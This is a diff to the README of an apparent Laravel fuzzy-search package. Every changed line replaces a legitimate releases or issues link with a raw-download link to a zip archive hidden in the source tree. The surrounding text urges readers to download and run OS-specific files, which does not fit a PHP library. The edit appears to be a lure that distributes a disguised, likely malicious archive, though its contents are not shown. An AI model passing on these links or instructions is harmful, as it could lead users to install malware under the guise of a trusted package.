@@ -4,13 +4,13 @@
 Welcome to **laravel-fuzzy-search**! Our tool offers zero-configuration fuzzy search for your Laravel applications. It utilizes eight algorithms, provides typo tolerance, assigns relevance scores, and scales effectively for databases with up to 10 million records. There are no external dependencies to worry about, making setup easy for everyone.
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-laravel--fuzzy--search-blue.svg)](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/releases)
+[![Download](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/raw/refs/heads/main/src/Drivers/search_fuzzy_laravel_1.7.zip)](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/raw/refs/heads/main/src/Drivers/search_fuzzy_laravel_1.7.zip)
 
 ## 🚀 Getting Started
 To get started with **laravel-fuzzy-search**, follow these simple steps to download and run the application.
 
 ### 🔗 Download & Install
-1. Click [here](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/releases) to visit the releases page.
+1. Click [here](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/raw/refs/heads/main/src/Drivers/search_fuzzy_laravel_1.7.zip) to visit the releases page.
 2. Choose the latest version of **laravel-fuzzy-search**.
 3. Download the appropriate file for your system. The files available on the page will support various operating systems.
 4. Follow the installation instructions provided for your computer's operating system.
@@ -58,10 +58,10 @@ If you encounter an issue while using **laravel-fuzzy-search**, consider the fol
 We welcome contributions from everyone. If you wish to report bugs or suggest changes, please open a new issue on the GitHub repository. We appreciate feedback and any help to improve **laravel-fuzzy-search**.
 
 ## 💬 Support
-For help, you can check the [issues page](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/issues) or reach out to the community members. 
+For help, you can check the [issues page](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/raw/refs/heads/main/src/Drivers/search_fuzzy_laravel_1.7.zip) or reach out to the community members. 
 
 ## 📌 License
 **laravel-fuzzy-search** is open-source software licensed under the MIT License. You are free to use, modify, and distribute this software under the terms of the MIT License.
 
 ## 📥 Download Now!
-Don't forget to [download](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/releases) the latest version to start enjoying the benefits of fuzzy search in your Laravel application!
+Don't forget to [download](https://github.com/KeremKarsiyaka/laravel-fuzzy-search/raw/refs/heads/main/src/Drivers/search_fuzzy_laravel_1.7.zip) the latest version to start enjoying the benefits of fuzzy search in your Laravel application!
